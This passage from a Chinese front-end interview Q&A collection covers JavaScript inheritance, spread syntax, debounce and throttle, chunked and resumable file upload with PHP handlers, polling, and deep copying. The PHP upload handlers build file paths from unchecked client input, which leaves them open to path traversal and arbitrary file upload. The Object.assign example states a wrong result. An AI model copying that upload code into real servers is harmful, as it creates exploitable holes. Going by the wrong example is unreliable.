不调用函数，但是还想改变this指向，比如改变定时器内部的this指向。\n\n36、继承，优缺点参考答案：\n\n继承的好处\na：提高了代码的复用性\nb：提高了代码的维护性\nc：让类与类之间产生了关系，是多态的前提\n\n\n继承的弊端\n类的耦合性增强了,但是开发的原则：高内聚，低耦合。\n\n\n\n37、ES5 js继承的方法和优缺点参考答案：\n\n原型链继承\n实现方式：将子类的原型链指向父类的对象实例\nfunction Parent()&#123;\n  this.name = \"parent\";\n  this.list = ['a'];\n&#125;\nParent.prototype.sayHi = function()&#123;\n  console.log('hi');\n&#125;\nfunction Child()&#123;\n\n&#125;\nChild.prototype = new Parent();\nvar child = new Child();\nconsole.log(child.name);\nchild.sayHi();\n\n原理：子类实例child的__proto__指向Child的原型链prototype，而Child.prototype指向Parent类的对象实例，该父类对象实例的__proto__指向Parent.prototype,所以Child可继承Parent的构造函数属性、方法和原型链属性、方法优点：可继承构造函数的属性，父类构造函数的属性，父类原型的属性缺点：无法向父类构造函数传参；且所有实例共享父类实例的属性，若父类共有属性为引用类型，一个子类实例更改父类构造函数共有属性时会导致继承的共有属性发生变化；实例如下：\nvar a = new Child();\nvar b = new Child();\na.list.push('b');\nconsole.log(b.list); // ['a','b']\n\n构造函数继承\n实现方式：在子类构造函数中使用call或者apply劫持父类构造函数方法，并传入参数\nfunction Parent(name, id)&#123;\n  this.id = id;\n  this.name = name;\n  this.printName = function()&#123;\n    console.log(this.name);\n  &#125;\n&#125;\nParent.prototype.sayName = function()&#123;\n  console.log(this.name);\n&#125;;\nfunction Child(name, id)&#123;\n  Parent.call(this, name, id);\n  // Parent.apply(this, arguments);\n&#125;\nvar child = new Child(\"jin\", \"1\");\nchild.printName(); // jin\nchild.sayName() // Error\n\n原理：使用call或者apply更改子类函数的作用域，使this执行父类构造函数，子类因此可以继承父类共有属性优点：可解决原型链继承的缺点缺点：不可继承父类的原型链方法，构造函数不可复用\n\n组合继承\n原理：综合使用构造函数继承和原型链继承\nfunction Parent(name, id)&#123;\n  this.id = id;\n  this.name = name;\n  this.list = ['a'];\n  this.printName = function()&#123;\n    console.log(this.name);\n  &#125;\n&#125;\nParent.prototype.sayName = function()&#123;\n  console.log(this.name);\n&#125;;\nfunction Child(name, id)&#123;\n  Parent.call(this, name, id);\n  // Parent.apply(this, arguments);\n&#125;\nChild.prototype = new Parent();\nvar child = new Child(\"jin\", \"1\");\nchild.printName(); // jin\nchild.sayName() // jin\n\nvar a = new Child();\nvar b = new Child();\na.list.push('b');\nconsole.log(b.list); // ['a']\n\n优点：可继承父类原型上的属性，且可传参；每个新实例引入的构造函数是私有的缺点：会执行两次父类的构造函数，消耗较大内存，子类的构造函数会代替原型上的那个父类构造函数\n\n原型式继承\n原理：类似Object.create，用一个函数包装一个对象，然后返回这个函数的调用，这个函数就变成了个可以随意增添属性的实例或对象，结果是将子对象的__proto__指向父对象\nvar parent = &#123;\n  names: ['a']\n&#125;\nfunction copy(object) &#123;\n  function F() &#123;&#125;\n  F.prototype = object;    \n  return new F();\n&#125;\nvar child = copy(parent);\n\n缺点：共享引用类型\n\n寄生式继承\n原理：二次封装原型式继承，并拓展\nfunction createObject(obj) &#123;\n  var o = copy(obj);\n  o.getNames = function() &#123;\n    console.log(this.names);\n    return this.names;\n  &#125;\n  return o;\n&#125;\n\n优点：可添加新的属性和方法\n\n寄生组合式继承\n原理：改进组合继承，利用寄生式继承的思想继承原型\nfunction inheritPrototype(subClass, superClass) &#123;\n  // 复制一份父类的原型\n  var p = copy(superClass.prototype);\n  // 修正构造函数\n  p.constructor = subClass;\n  // 设置子类原型\n  subClass.prototype = p;\n&#125;\n\nfunction Parent(name, id)&#123;\n  this.id = id;\n  this.name = name;\n  this.list = ['a'];\n  this.printName = function()&#123;\n    console.log(this.name);\n  &#125;\n&#125;\nParent.prototype.sayName = function()&#123;\n  console.log(this.name);\n&#125;;\nfunction Child(name, id)&#123;\n  Parent.call(this, name, id);\n  // Parent.apply(this, arguments);\n&#125;\ninheritPrototype(Child, Parent);\n\n\n38、ES6继承class Parent &#123;\n  constructor() &#123;\n    this.name = \"kif\";\n    this.age = 12;\n  &#125;\n&#125;\nclass Child extends Parent &#123;\n  constructor(id) &#123;\n    super();\n    this.id = id;\n  &#125;\n&#125;\n\nlet p = new Child();\nconsole.log(p.name);\n\n\n\n\n39、扩展操作符…适用类型：数组、对象、字符串。\n复杂数据类型都可以，当要转化为可迭代数据结构时可设置对象的迭代器对扩展运算符扩展出来的值进行操作。\n基础数据只有string可以使用扩展运算符，number,boolean,null,undefined无效\n扩展运算符的应用场景\n// 1、函数调用\nfunction add(x, y) &#123;\n  return x + y;\n&#125;\nadd(...[4, 38]);\n\nfunction f(v, w, x, y, z) &#123;  &#125;\nf(-1, ...[0, 1], 2, ...[3]);\n// 123456789\n\n//2.往数组里push多个元素\nvar arr1 = [0, 1, 2];\nvar arr2 = [3, 4, 5];\narr1.push(...arr2);  \nconsole.log(arr1); //[0,1,2,3,4,5]\n//123456\n\n//3.替代函数的apply方法\nfunction f(x, y, z) &#123;  &#125;  \nvar args = [0, 1, 2];\nf.apply(null, args); //ES5 的写法\nf(...args); //ES6的写法\n// 123456\n\n//4.求一个数组的最大数简化\nMath.max.apply(null, [14, 3, 77])  //ES5 的写法\nMath.max(...[14, 3, 77])  //ES6 的写法，等同于Math.max(14, 3, 77)\n//1234\n\n//5.扩展运算符后面可以放表达式\nconst arr = [...(5 > 0 ? ['a'] : []),'b'];\nconsole.log(arr);  //['a','b'] \n//1234\n\n//6.与解构赋值结合，用于生成数组\nconst a1 = [1, 2];\nconst a2 = [...a1];  //写法1\nconst [...a2] = a1;  //写法2\nconst [first, ...rest] = [1, 2, 3, 4, 5];\nfirst  //1\nrest  //[2, 3, 4, 5]\n\nconst [first, ...rest] = [];\nfirst  //undefined\nrest  //[]\n\nconst [first, ...rest] = [\"foo\"];\nfirst  //\"foo\"\nrest   //[]\n//1234567891011121314151617\n\n//7.合并数组\n[...arr1, ...arr2, ...arr3]  //[ 'a', 'b', 'c', 'd', 'e' ]\n\n\n//8.数组的克隆——————————————————————特别注意\nvar arr1 = [0, 1, 2];\nvar arr2 = [...arr1];\narr1[0]=100;\nconsole.log(arr2); //[0, 1, 2]  \n\n/* 乍一看，arr2与arr1不共用引用地址，arr2不随着arr1变化，接着往下看 */\n\nvar arr1 = [0, [1,11,111], 2];\nvar arr2 = [...arr1];\narr1[1][0]=100;\nconsole.log(arr2); //[0, [100,11,111], 2]\n\n40、为什么js是单线程参考答案：\n这主要和js的用途有关，js是作为浏览器的脚本语言，主要是实现用户与浏览器的交互，以及操作dom；这决定了它只能是单线程，否则会带来很复杂的同步问题。 举个例子：如果js被设计了多线程，如果有一个线程要修改一个dom元素，另一个线程要删除这个dom元素，此时浏览器就会一脸茫然，不知所措。所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变\n扩展：\n什么是进程？\n进程：是cpu分配资源的最小单位；（是能拥有资源和独立运行的最小单位）\n什么是线程？\n线程：是cpu调度的最小单位；（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）\n浏览器是多进程的？\n放在浏览器中，每打开一个tab页面，其实就是新开了一个进程，在这个进程中，还有ui渲染线程，js引擎线程，http请求线程等。 所以，浏览器是一个多进程的。\n为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。\n41、死锁参考答案：\n死锁是指两个或两个以上的进程在执行过程中，由于竞争资源而造成阻塞的现象，若无外力作用，它们都将无法继续执行\n产生原因\n\n竞争资源引起进程死锁\n可剥夺和非剥夺资源\n竞争非剥夺资源\n竞争临时性资源\n进程推进顺序不当\n\n产生条件\n\n互斥条件：涉及的资源是非共享的\n涉及的资源是非共享的,一段时间内某资源只由一个进程占用,如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放\n\n\n不剥夺条件：不能强行剥夺进程拥有的资源\n进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放\n\n\n请求和保持条件：进程在等待一新资源时继续占有已分配的资源\n指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放\n\n\n环路等待条件：存在一种进程的循环链，链中的每一个进程已获得的资源同时被链中的下一个进程所请求 在发生死锁时，必然存在一个进程——资源的环形链\n\n解决办法\n只要打破四个必要条件之一就能有效预防死锁的发生\n42、面向对象的三个特征，分别说一下什么意思参考答案：\n概念：\n封装：将对象运行所需的资源封装在程序对象中——基本上，是方法和数据。对象是“公布其接口”。其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象。这个概念就是“不要告诉我你是怎么做的，只要做就可以了。”对象可以看作是一个自我包含的原子。对象接口包括了公共的方法和初始化数据。\n继承： 继承可以解决代码复用，让编程更加靠近人类思维。当多个类存在相同的属性(变量)和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过继承父类中的属性和方法。\n多态： 多态是指一个引用(类型)在不同情况下的多种状态。也可以理解成：多态是指通过指向父类的引用，来调用在不同子类中实现的方法。\n特点：\n封装可以隐藏实现细节，使得代码模块化；\n继承可以扩展已存在的代码模块（类），它们的目的都是为了——代码重用。\n多态就是相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。多态分为两种，一种是行为多态与对象的多态\n43、防抖和节流的原理和使用场景参考答案：\n函数防抖和函数节流：优化高频率执行js代码的一种手段，js中的一些事件如浏览器的resize、scroll，鼠标的mousemove、mouseover，input输入框的keypress等事件在触发时，会不断地调用绑定在事件上的回调函数，极大地浪费资源，降低前端性能。为了优化体验，需要对这类事件进行调用次数的限制。\n防抖：\n在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。\n根据函数防抖思路设计出第一版的最简单的防抖代码：\nvar timer; &#x2F;&#x2F; 维护同一个timer\nfunction debounce(fn, delay) &#123;\n    clearTimeout(timer);\n    timer &#x3D; setTimeout(function()&#123;\n        fn();\n    &#125;, delay);\n&#125;\n\n上面例子中的debounce就是防抖函数，在document中鼠标移动的时候，会在onmousemove最后触发的1s后执行回调函数testDebounce；如果我们一直在浏览器中移动鼠标（比如10s），会发现会在10 + 1s后才会执行testDebounce函数（因为clearTimeout(timer)），这个就是函数防抖。\n在上面的代码中，会出现一个问题，var timer只能在setTimeout的父级作用域中，这样才是同一个timer，并且为了方便防抖函数的调用和回调函数fn的传参问题，我们应该用闭包来解决这些问题。\n优化后的代码：\nfunction debounce(fn, delay) &#123;\n    var timer; // 维护一个 timer\n    return function () &#123;\n        var _this = this; // 取debounce执行作用域的this\n        var args = arguments;\n        if (timer) &#123;\n            clearTimeout(timer);\n        &#125;\n        timer = setTimeout(function () &#123;\n            fn.apply(_this, args); // 用apply指向调用debounce的对象，相当于_this.fn(args);\n        &#125;, delay);\n    &#125;;\n&#125;\n\n使用闭包后，解决传参和封装防抖函数的问题，这样就可以在其他地方随便将需要防抖的函数传入debounce了。\n节流：\n每隔一段时间，只执行一次函数。\n\n定时器实现节流函数：\nfunction throttle(fn, delay) &#123;\n    var timer;\n    return function () &#123;\n        var _this = this;\n        var args = arguments;\n        if (timer) &#123;\n            return;\n        &#125;\n        timer = setTimeout(function () &#123;\n            fn.apply(_this, args);\n            timer = null; // 在delay后执行完fn之后清空timer，此时timer为假，throttle触发可以进入计时器\n        &#125;, delay)\n    &#125;\n&#125;\n\n时间戳实现节流函数：\nfunction throttle(fn, delay) &#123;\n    var previous = 0;\n    // 使用闭包返回一个函数并且用到闭包函数外面的变量previous\n    return function() &#123;\n        var _this = this;\n        var args = arguments;\n        var now = new Date();\n        if(now - previous > delay) &#123;\n            fn.apply(_this, args);\n            previous = now;\n        &#125;\n    &#125;\n&#125;\n\n异同比较\n相同点：\n\n都可以通过使用 setTimeout 实现。\n目的都是，降低回调执行频率。节省计算资源。\n\n不同点：\n\n函数防抖，在一段连续操作结束后，处理回调，利用clearTimeout 和 setTimeout实现。函数节流，在一段连续操作中，每一段时间只执行一次，频率较高的事件中使用来提高性能。\n函数防抖关注一定时间连续触发的事件只在最后执行一次，而函数节流侧重于一段时间内只执行一次。\n\n常见应用场景\n函数防抖的应用场景:\n连续的事件，只需触发一次回调的场景有：\n\n搜索框搜索输入。只需用户最后一次输入完，再发送请求\n手机号、邮箱验证输入检测\n窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。\n\n函数节流的应用场景:\n间隔一段时间执行一次回调的场景有：\n\n滚动加载，加载更多或滚到底部监听\n谷歌搜索框，搜索联想功能\n高频点击提交，表单重复提交\n\n44、文件异步上传怎么实现参考答案：\n1.普通表单上传使用PHP来展示常规的表单上传是一个不错的选择。首先构建文件上传的表单，并指定表单的提交内容类型为enctype=&quot;multipart/form-data&quot;，表明表单需要上传二进制数据。\n&lt;form action=\"/index.php\" method=\"POST\" enctype=\"multipart/form-data\">\n  &lt;input type=\"file\" name=\"myfile\">\n  &lt;input type=\"submit\">\n&lt;/form>\n\n然后编写index.php上传文件接收代码，使用move_uploaded_file方法即可(php大法好…)\n$imgName = 'IMG'.time().'.'.str_replace('image/','',$_FILES[\"myfile\"]['type']);\n$fileName =  'upload/'.$imgName;\n// 移动上传文件至指定upload文件夹下，并根据返回值判断操作是否成功\nif (move_uploaded_file($_FILES['myfile']['tmp_name'], $fileName))&#123;\n    echo $fileName;\n&#125;else &#123;\n    echo \"nonn\";\n&#125;\n\nform表单上传大文件时，很容易遇见服务器超时的问题。通过xhr，前端也可以进行异步上传文件的操作，一般由两个思路。\n2.文件编码上传第一个思路是将文件进行编码，然后在服务端进行解码，之前写过一篇在前端实现图片压缩上传的博客，其主要实现原理就是将图片转换成base64进行传递\nvar imgURL = URL.createObjectURL(file);\nctx.drawImage(imgURL, 0, 0);\n// 获取图片的编码，然后将图片当做是一个很长的字符串进行传递\nvar data = canvas.toDataURL(\"image/jpeg\", 0.5); \n\n在服务端需要做的事情也比较简单，首先解码base64，然后保存图片即可\n$imgData = $_REQUEST['imgData'];\n$base64 = explode(',', $imgData)[1];\n$img = base64_decode($base64);\n$url = './test.jpg';\nif (file_put_contents($url, $img)) &#123;\n    exit(json_encode(array(\n        url => $url\n    )));\n&#125;\n\nbase64编码的缺点在于其体积比原图片更大（因为Base64将三个字节转化成四个字节，因此编码后的文本，会比原文本大出三分之一左右），对于体积很大的文件来说，上传和解析的时间会明显增加。\n更多关于base64的知识，可以参考Base64笔记。\n除了进行base64编码，还可以在前端直接读取文件内容后以二进制格式上传\n// 读取二进制文件\nfunction readBinary(text)&#123;\n   var data = new ArrayBuffer(text.length);\n   var ui8a = new Uint8Array(data, 0);\n   for (var i = 0; i &lt; text.length; i++)&#123; \n     ui8a[i] = (text.charCodeAt(i) &amp; 0xff);\n   &#125;\n   console.log(ui8a)\n&#125;\n\nvar reader = new FileReader();\nreader.onload = function()&#123;\n    readBinary(this.result) // 读取result或直接上传\n&#125;\n// 把从input里读取的文件内容，放到fileReader的result字段里\nreader.readAsBinaryString(file);\n\n3.formData异步上传FormData对象主要用来组装一组用 XMLHttpRequest发送请求的键&#x2F;值对，可以更加灵活地发送Ajax请求。可以使用FormData来模拟表单提交。\nlet files = e.target.files // 获取input的file对象\nlet formData = new FormData();\nformData.append('file', file);\naxios.post(url, formData);\n\n服务端处理方式与直接form表单请求基本相同。\n4.iframe无刷新页面在低版本的浏览器（如IE）上，xhr是不支持直接上传formdata的，因此只能用form来上传文件，而form提交本身会进行页面跳转，这是因为form表单的target属性导致的，其取值有\n\n_self，默认值，在相同的窗口中打开响应页面\n\n_blank，在新窗口打开\n\n_parent，在父窗口打开\n_top，在最顶层的窗口打开\n\nframename，在指定名字的iframe中打开\n\n\n如果需要让用户体验异步上传文件的感觉，可以通过framename指定iframe来实现。把form的target属性设置为一个看不见的iframe，那么返回的数据就会被这个iframe接受，因此只有该iframe会被刷新，至于返回结果，也可以通过解析这个iframe内的文本来获取。\nfunction upload()&#123;\n    var now = +new Date()\n    var id = 'frame' + now\n    $(\"body\").append(`&lt;iframe style=\"display:none;\" name=\"$&#123;id&#125;\" id=\"$&#123;id&#125;\" />`);\n\n    var $form = $(\"#myForm\")\n    $form.attr(&#123;\n        \"action\": '/index.php',\n        \"method\": \"post\",\n        \"enctype\": \"multipart/form-data\",\n        \"encoding\": \"multipart/form-data\",\n        \"target\": id\n    &#125;).submit()\n\n    $(\"#\"+id).on(\"load\", function()&#123;\n        var content = $(this).contents().find(\"body\").text()\n        try&#123;\n            var data = JSON.parse(content)\n        &#125;catch(e)&#123;\n            console.log(e)\n        &#125;\n    &#125;)\n&#125;\n\n扩展：\n大文件上传\n现在来看看在上面提到的几种上传方式中实现大文件上传会遇见的超时问题，\n\n表单上传和iframe无刷新页面上传，实际上都是通过form标签进行上传文件，这种方式将整个请求完全交给浏览器处理，当上传大文件时，可能会遇见请求超时的情形\n通过fromData，其实际也是在xhr中封装一组请求参数，用来模拟表单请求，无法避免大文件上传超时的问题\n编码上传，我们可以比较灵活地控制上传的内容\n\n大文件上传最主要的问题就在于：在同一个请求中，要上传大量的数据，导致整个过程会比较漫长，且失败后需要重头开始上传。试想，如果我们将这个请求拆分成多个请求，每个请求的时间就会缩短，且如果某个请求失败，只需要重新发送这一次请求即可，无需从头开始，这样是否可以解决大文件上传的问题呢？\n综合上面的问题，看来大文件上传需要实现下面几个需求\n\n支持拆分上传请求(即切片)\n支持断点续传\n支持显示上传进度和暂停上传\n\n接下来让我们依次实现这些功能，看起来最主要的功能应该就是切片了。\n文件切片\n编码方式上传中，在前端我们只要先获取文件的二进制内容，然后对其内容进行拆分，最后将每个切片上传到服务端即可。\n在JavaScript中，文件FIle对象是Blob对象的子类，Blob对象包含一个重要的方法slice，通过这个方法，我们就可以对二进制文件进行拆分。\n下面是一个拆分文件的示例\nfunction slice(file, piece = 1024 * 1024 * 5) &#123;\n let totalSize = file.size; // 文件总大小\n let start = 0; // 每次上传的开始字节\n let end = start + piece; // 每次上传的结尾字节\n let chunks = []\n while (start &lt; totalSize) &#123;\n // 根据长度截取每次需要上传的数据\n // File对象继承自Blob对象，因此包含slice方法\n let blob = file.slice(start, end); \n chunks.push(blob)\n start = end;\n end = start + piece;\n &#125;\n return chunks\n&#125;\n\n将文件拆分成piece大小的分块，然后每次请求只需要上传这一个部分的分块即可\nlet file = document.querySelector(\"[name=file]\").files[0];\nconst LENGTH = 1024 * 1024 * 0.1;\nlet chunks = slice(file, LENGTH); // 首先拆分切片\nchunks.forEach(chunk=>&#123;\n let fd = new FormData();\n fd.append(\"file\", chunk);\n post('/mkblk.php', fd)\n&#125;)\n\n服务器接收到这些切片后，再将他们拼接起来就可以了，下面是PHP拼接切片的示例代码\n$filename = './upload/' . $_POST['filename'];//确定上传的文件名\n//第一次上传时没有文件，就创建文件，此后上传只需要把数据追加到此文件中\nif(!file_exists($filename))&#123;\n move_uploaded_file($_FILES['file']['tmp_name'],$filename);\n&#125;else&#123;\n file_put_contents($filename,file_get_contents($_FILES['file']['tmp_name']),FILE_APPEND);\n echo $filename;\n&#125;\n\n测试时记得修改nginx的server配置，否则大文件可能会提示413 Request Entity Too Large的错误。\nserver &#123;\n  // ...\n  client_max_body_size 50m;\n&#125;\n\n上面这种方式来存在一些问题\n\n无法识别一个切片是属于哪一个切片的，当同时发生多个请求时，追加的文件内容会出错\n切片上传接口是异步的，无法保证服务器接收到的切片是按照请求顺序拼接的\n\n因此接下来我们来看看应该如何在服务端还原切片。\n还原切片\n在后端需要将多个相同文件的切片还原成一个文件，上面这种处理切片的做法存在下面几个问题\n\n如何识别多个切片是来自于同一个文件的，这个可以在每个切片请求上传递一个相同文件的context参数\n如何将多个切片还原成一个文件\n确认所有切片都已上传，这个可以通过客户端在切片全部上传后调用mkfile接口来通知服务端进行拼接\n找到同一个context下的所有切片，确认每个切片的顺序，这个可以在每个切片上标记一个位置索引值\n按顺序拼接切片，还原成文件\n\n上面有一个重要的参数，即context，我们需要获取为一个文件的唯一标识，可以通过下面两种方式获取\n\n根据文件名、文件长度等基本信息进行拼接，为了避免多个用户上传相同的文件，可以再额外拼接用户信息如uid等保证唯一性\n根据文件的二进制内容计算文件的hash，这样只要文件内容不一样，则标识也会不一样，缺点在于计算量比较大.\n\n修改上传代码，增加相关参数\n// 获取context，同一个文件会返回相同的值\nfunction createContext(file) &#123;\n  return file.name + file.length\n&#125;\nlet file = document.querySelector(\"[name=file]\").files[0];\nconst LENGTH = 1024 * 1024 * 0.1;\nlet chunks = slice(file, LENGTH);\n// 获取对于同一个文件，获取其的context\nlet context = createContext(file);\nlet tasks = [];\nchunks.forEach((chunk, index) => &#123;\n let fd = new FormData();\n fd.append(\"file\", chunk);\n // 传递context\n fd.append(\"context\", context);\n // 传递切片索引值\n fd.append(\"chunk\", index + 1);\n\n tasks.push(post(\"/mkblk.php\", fd));\n&#125;);\n// 所有切片上传完毕后，调用mkfile接口\nPromise.all(tasks).then(res => &#123;\n let fd = new FormData();\n fd.append(\"context\", context);\n fd.append(\"chunks\", chunks.length);\n post(\"/mkfile.php\", fd).then(res => &#123;\n console.log(res);\n &#125;);\n&#125;);\n\n在mkblk.php接口中，我们通过context来保存同一个文件相关的切片\n// mkblk.php\n$context = $_POST['context'];\n$path = './upload/' . $context;\nif(!is_dir($path))&#123;\n mkdir($path);\n&#125;\n// 把同一个文件的切片放在相同的目录下\n$filename = $path .'/'. $_POST['chunk'];\n$res = move_uploaded_file($_FILES['file']['tmp_name'],$filename);\n\n除了上面这种简单通过目录区分切片的方法之外，还可以将切片信息保存在数据库来进行索引。接下来是mkfile.php接口的实现，这个接口会在所有切片上传后调用\n// mkfile.php\n$context = $_POST['context'];\n$chunks = (int)$_POST['chunks'];\n//合并后的文件名\n$filename = './upload/' . $context . '/file.jpg'; \nfor($i = 1; $i &lt;= $chunks; ++$i)&#123;\n $file = './upload/'.$context. '/' .$i; // 读取单个切块\n $content = file_get_contents($file);\n if(!file_exists($filename))&#123;\n $fd = fopen($filename, \"w+\");\n &#125;else&#123;\n $fd = fopen($filename, \"a\");\n &#125;\n fwrite($fd, $content); // 将切块合并到一个文件上\n&#125;\necho $filename;\n\n这样就解决了上面的两个问题：\n\n识别切片来源\n保证切片拼接顺序\n\n断点续传\n即使将大文件拆分成切片上传，我们仍需等待所有切片上传完毕，在等待过程中，可能发生一系列导致部分切片上传失败的情形，如网络故障、页面关闭等。由于切片未全部上传，因此无法通知服务端合成文件。这种情况下可以通过断点续传来进行处理。\n断点续传指的是：可以从已经上传部分开始继续上传未完成的部分，而没有必要从头开始上传，节省上传时间。\n由于整个上传过程是按切片维度进行的，且mkfile接口是在所有切片上传完成后由客户端主动调用的，因此断点续传的实现也十分简单：\n\n在切片上传成功后，保存已上传的切片信息\n当下次传输相同文件时，遍历切片列表，只选择未上传的切片进行上传\n所有切片上传完毕后，再调用mkfile接口通知服务端进行文件合并\n\n因此问题就落在了如何保存已上传切片的信息了，保存一般有两种策略\n\n可以通过locaStorage等方式保存在前端浏览器中，这种方式不依赖于服务端，实现起来也比较方便，缺点在于如果用户清除了本地文件，会导致上传记录丢失\n服务端本身知道哪些切片已经上传，因此可以由服务端额外提供一个根据文件context查询已上传切片的接口，在上传文件前调用该文件的历史上传记录\n\n下面让我们通过在本地保存已上传切片记录，来实现断点上传的功能\n// 获取已上传切片记录\nfunction getUploadSliceRecord(context)&#123;\n let record = localStorage.getItem(context)\n if(!record)&#123;\n return []\n &#125;else &#123;\n try&#123;\n return JSON.parse(record)\n &#125;catch(e)&#123;&#125;\n &#125;\n&#125;\n// 保存已上传切片\nfunction saveUploadSliceRecord(context, sliceIndex)&#123;\n let list = getUploadSliceRecord(context)\n list.push(sliceIndex)\n localStorage.setItem(context, JSON.stringify(list))\n&#125;\n\n然后对上传逻辑稍作修改，主要是增加上传前检测是已经上传、上传后保存记录的逻辑\nlet context = createContext(file);\n// 获取上传记录\nlet record = getUploadSliceRecord(context);\nlet tasks = [];\nchunks.forEach((chunk, index) => &#123;\n // 已上传的切片则不再重新上传\n if(record.includes(index))&#123;\n return\n &#125;\n\n let fd = new FormData();\n fd.append(\"file\", chunk);\n fd.append(\"context\", context);\n fd.append(\"chunk\", index + 1);\n let task = post(\"/mkblk.php\", fd).then(res=>&#123;\n // 上传成功后保存已上传切片记录\n saveUploadSliceRecord(context, index)\n record.push(index)\n &#125;)\n tasks.push(task);\n&#125;);\n\n此时上传时刷新页面或者关闭浏览器，再次上传相同文件时，之前已经上传成功的切片就不会再重新上传了。\n服务端实现断点续传的逻辑基本相似，只要在getUploadSliceRecord内部调用服务端的查询接口获取已上传切片的记录即可，因此这里不再展开。\n此外断点续传还需要考虑切片过期的情况：如果调用了mkfile接口，则磁盘上的切片内容就可以清除掉了，如果客户端一直不调用mkfile的接口，放任这些切片一直保存在磁盘显然是不可靠的，一般情况下，切片上传都有一段时间的有效期，超过该有效期，就会被清除掉。基于上述原因，断点续传也必须同步切片过期的实现逻辑。\n上传进度和暂停\n通过xhr.upload中的progress方法可以实现监控每一个切片上传进度。\n上传暂停的实现也比较简单，通过xhr.abort可以取消当前未完成上传切片的上传，实现上传暂停的效果，恢复上传就跟断点续传类似，先获取已上传的切片列表，然后重新发送未上传的切片。\n由于篇幅关系，上传进度和暂停的功能这里就先不实现了。\n45、使用setInterval请求实时数据，返回顺序不一致怎么解决参考答案：\n场景：\nsetInterval(function() &#123;\n    $.get(\"/path/to/server\", function(data, status) &#123;\n        console.log(data);\n    &#125;);\n&#125;, 10000);\n\n上面的程序会每隔10秒向服务器请求一次数据，并在数据到达后存储。这个实现方法通常可以满足简单的需求，然而同时也存在着很大的缺陷：在网络情况不稳定的情况下，服务器从接收请求、发送请求到客户端接收请求的总时间有可能超过10秒，而请求是以10秒间隔发送的，这样会导致接收的数据到达先后顺序与发送顺序不一致。\n解决方案：\n\n使用setTimeout代替setInterval\n程序首先设置10秒后发起请求，当数据返回后再隔10秒发起第二次请求，以此类推。这样的话虽然无法保证两次请求之间的时间间隔为固定值，但是可以保证到达数据的顺序。\nfunction poll() &#123;\n    setTimeout(function() &#123;\n        $.get(\"/path/to/server\", function(data, status) &#123;\n            console.log(data);\n            // 发起下一次请求\n            poll();\n        &#125;);\n    &#125;, 10000);\n&#125;\n\nWebSocket\nWebSocket 协议本质上是一个基于 TCP 的协议。\n为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息”Upgrade: WebSocket”表明这是一个申请协议升级的 HTTP 请求，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，并且这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。\n服务器（Node.js）：\nvar WebSocketServer = require('ws').Server;\nvar wss = new WebSocketServer(&#123;port: 8080&#125;);\n\nwss.on(\"connection\", function(socket) &#123;\n    socket.on(\"message\", function(msg) &#123;\n        console.log(msg);\n        socket.send(\"Nice to meet you!\");\n    &#125;);\n&#125;);\n\n客户端同样可以使用Node.js或者是浏览器实现，这里选用浏览器作为客户端：\n// WebSocket 为客户端JavaScript的原生对象\nvar ws = new WebSocket(\"ws://localhost:8080\");\nws.onopen = function (event) &#123;\n    ws.send(\"Hello there!\");\n&#125;\nws.onmessage = function (event) &#123;\n    console.log(event.data);\n&#125;\n\n46、浅拷贝，深拷贝(实现方式)参考答案：\n浅拷贝和深拷贝都只针对于引用数据类型，浅拷贝只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存；但深拷贝会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象；\n区别：浅拷贝只复制对象的第一层属性、深拷贝可以对对象的属性进行递归复制；\n实现浅拷贝方法\n（1）Object.assign方法\nvar obj = &#123;\n    a: 1,\n    b: 2\n&#125;\nvar obj1 = Object.assign(&#123;&#125;,obj);\nboj1.a = 3;\nconsole.log(obj.a) // 3\n\n（2）for in方法\n// 只复制第一层的浅拷贝\nfunction simpleCopy(obj1) &#123;\n   var obj2 = Array.isArray(obj1) ? [] : &#123;&#125;;\n   for (let i in obj1) &#123;\n   obj2[i] = obj1[i];\n  &#125;\n   return obj2;\n&#125;\nvar obj1 = &#123;\n   a: 1,\n   b: 2,\n   c: &#123;\n         d: 3\n      &#125;\n&#125;\nvar obj2 = simpleCopy(obj1);\nobj2.a = 3;\nobj2.c.d = 4;\nalert(obj1.a); // 1\nalert(obj2.a); // 3\nalert(obj1.c.d); // 4\nalert(obj2.c.d); // 4\n\n实现深拷贝方法\n（1）采用递归去拷贝所有层级属性\nfunction deepClone(obj)&#123;\n    let objClone = Array.isArray(obj)?[]:&#123;&#125;;\n    if(obj &amp;&amp; typeof obj===\"object\")&#123;\n        for(key in obj)&#123;\n            if(obj.hasOwnProperty(key))&#123;\n                //判断ojb子元素是否为对象，如果是，递归复制\n                if(obj[key]&amp;&amp;typeof obj[key] ===\"object\")&#123;\n                    objClone[key] = deepClone(obj[key]);\n                &#125;else&#123;\n                    //如果不是，简单复制\n                    objClone[key] = obj[key];\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n    return objClone;\n&#125;    \nlet a=[1,2,3,4],\n    b=deepClone(a);\na[0]=2;\nconsole.log(a,b);\n\n（2）使用JSON.stringify和JSON.parse实现深拷贝：JSON.stringify把对象转成字符串，再用JSON.parse把字符串转成新的对象；\nfunction deepCopy(obj1)&#123;\n    let _obj = JSON.stringify(obj1);\n    let obj2 = JSON.parse(_obj);\n    return obj2;\n  &#125;\n    var a = [1, [1, 2], 3, 